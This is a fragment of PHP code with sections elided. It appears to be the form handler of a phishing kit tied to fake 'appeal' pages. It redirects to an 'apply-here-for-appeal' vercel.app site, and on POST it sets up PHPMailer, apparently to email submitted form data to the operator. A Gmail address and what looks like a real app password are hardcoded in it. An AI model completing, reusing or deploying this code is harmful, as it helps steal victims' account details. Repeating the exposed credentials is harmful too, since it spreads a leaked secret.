...
header("Location: https://again-apply-here-for-appeal.vercel.app/");
...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    try {
        ...
        $mail->SMTPAuth   = true;
        $mail->Username   = 'dizzainsponsored@gmail.com'; // Replace with your email address
        $mail->Password   = 'neau wmlm sskr ynos'; // Replace with your email password
        $mail->SMTPSecure = 'tls';
        $mail->Port       = 587;
